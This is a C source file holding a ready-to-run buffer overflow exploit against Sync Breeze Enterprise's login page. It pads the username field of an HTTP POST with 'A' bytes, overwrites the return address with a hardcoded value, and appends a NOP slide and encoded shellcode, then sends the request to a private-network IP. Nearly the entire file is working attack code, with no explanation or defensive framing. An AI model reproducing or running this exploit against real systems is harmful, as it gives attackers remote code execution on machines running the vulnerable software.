/*
Sync Breeze Enterprise BOF - Ivan Ivanovic Ivanov Иван-дурак
недействительный 31337 Team
*/

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define DEFAULT_BUFLEN 512

#include <inttypes.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

DWORD SendRequest(char *request, int request_size) {
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    char recvbuf[DEFAULT_BUFLEN];
    int recvbuflen = DEFAULT_BUFLEN;
    int iResult;

    printf("\n[>] Initialising Winsock...\n");
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
    {
        printf("[!] Failed. Error Code : %d", WSAGetLastError());
        return 1;
    }

    printf("[>] Initialised.\n");
    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
    {
        printf("[!] Could not create socket : %d", WSAGetLastError());
    }

    printf("[>] Socket created.\n");
    server.sin_addr.s_addr = inet_addr("192.168.180.10");
    server.sin_family = AF_INET;
    server.sin_port = htons(80);

    if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)
    {
        puts("[!] Connect error");
        return 1;
    }
    puts("[>] Connected");

    if (send(s, request, request_size, 0) < 0)
    {
        puts("[!] Send failed");
        return 1;
    }
    puts("\n[>] Request sent\n");
    closesocket(s);
    return 0;
}

void EvilRequest() {

    char request_one[] = "POST /login HTTP/1.1\r\n"
                        "Host: 192.168.180.10\r\n"
                        "User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
                        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                        "Accept-Language: en-US,en;q=0.5\r\n"
                        "Referer: http://192.168.180.10/login\r\n"
                        "Connection: close\r\n"
                        "Content-Type: application/x-www-form-urlencoded\r\n"
                        "Content-Length: ";
    char request_two[] = "\r\n\r\nusername=";

    int initial_buffer_size = 781;
    char *padding = malloc(initial_buffer_size);
    memset(padding, 0x41, initial_buffer_size);
    memset(padding + initial_buffer_size - 1, 0x00, 1);
    unsigned char retn[] = "\x83\x0c\x09\x10"; // 0x10090c83

    unsigned char shellcode[] =
    "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90" // NOP SLIDE
    "\xdb\xc2\xbe\xb5\xe1\x28\x96\xd9\x74\x24\xf4\x5f\x31\xc9"
"\xb1\x52\x83\xc7\x04\x31\x77\x13\x03\xc2\xf2\xca\x63\xd0"
"\x1d\x88\x8c\x28\xde\xed\x05\xcd\xef\x2d\x71\x86\x40\x9e"
"\xf1\xca\x6c\x55\x57\xfe\xe7\x1b\x70\xf1\x40\x91\xa6\x3c"
"\x50\x8a\x9b\x5f\xd2\xd1\xcf\xbf\xeb\x19\x02\xbe\x2c\x47"
"\xef\x92\xe5\x03\x42\x02\x81\x5e\x5f\xa9\xd9\x4f\xe7\x4e"
"\xa9\x6e\xc6\xc1\xa1\x28\xc8\xe0\x66\x41\x41\xfa\x6b\x6c"
"\x1b\x71\x5f\x1a\x9a\x53\x91\xe3\x31\x9a\x1d\x16\x4b\xdb"
"\x9a\xc9\x3e\x15\xd9\x74\x39\xe2\xa3\xa2\xcc\xf0\x04\x20"
"\x76\xdc\xb5\xe5\xe1\x97\xba\x42\x65\xff\xde\x55\xaa\x74"
"\xda\xde\x4d\x5a\x6a\xa4\x69\x7e\x36\x7e\x13\x27\x92\xd1"
"\x2c\x37\x7d\x8d\x88\x3c\x90\xda\xa0\x1f\xfd\x2f\x89\x9f"
"\xfd\x27\x9a\xec\xcf\xe8\x30\x7a\x7c\x60\x9f\x7d\x83\x5b"
"\x67\x11\x7a\x64\x98\x38\xb9\x30\xc8\x52\x68\x39\x83\xa2"
"\x95\xec\x04\xf2\x39\x5f\xe5\xa2\xf9\x0f\x8d\xa8\xf5\x70"
"\xad\xd3\xdf\x18\x44\x2e\x88\xe6\x31\x47\xfc\x8f\x43\xa7"
"\xdf\x66\xcd\x41\x75\x69\x9b\xda\xe2\x10\x86\x90\x93\xdd"
"\x1c\xdd\x94\x56\x93\x22\x5a\x9f\xde\x30\x0b\x6f\x95\x6a"
"\x9a\x70\x03\x02\x40\xe2\xc8\xd2\x0f\x1f\x47\x85\x58\xd1"
"\x9e\x43\x75\x48\x09\x71\x84\x0c\x72\x31\x53\xed\x7d\xb8"
"\x16\x49\x5a\xaa\xee\x52\xe6\x9e\xbe\x04\xb0\x48\x79\xff"
"\x72\x22\xd3\xac\xdc\xa2\xa2\x9e\xde\xb4\xaa\xca\xa8\x58"
"\x1a\xa3\xec\x67\x93\x23\xf9\x10\xc9\xd3\x06\xcb\x49\xf3"
"\xe4\xd9\xa7\x9c\xb0\x88\x05\xc1\x42\x67\x49\xfc\xc0\x8d"
"\x32\xfb\xd9\xe4\x37\x47\x5e\x15\x4a\xd8\x0b\x19\xf9\xd9"
"\x19";


    char request_three[] = "&password=A";

    int content_length = 9 + strlen(padding) + strlen(retn) + strlen(shellcode) + strlen(request_three);
    char *content_length_string = malloc(15);
    sprintf(content_length_string, "%d", content_length);
    int buffer_length = strlen(request_one) + strlen(content_length_string) + initial_buffer_size + strlen(retn) + strlen(request_two) + strlen(shellcode) + strlen(request_three);

    char *buffer = malloc(buffer_length);
    memset(buffer, 0x00, buffer_length);
    strcpy(buffer, request_one);
    strcat(buffer, content_length_string);
    strcat(buffer, request_two);
    strcat(buffer, padding);
    strcat(buffer, retn);
    strcat(buffer, shellcode);
    strcat(buffer, request_three);

    SendRequest(buffer, strlen(buffer));
}

int main() {

    EvilRequest();
    return 0;
}
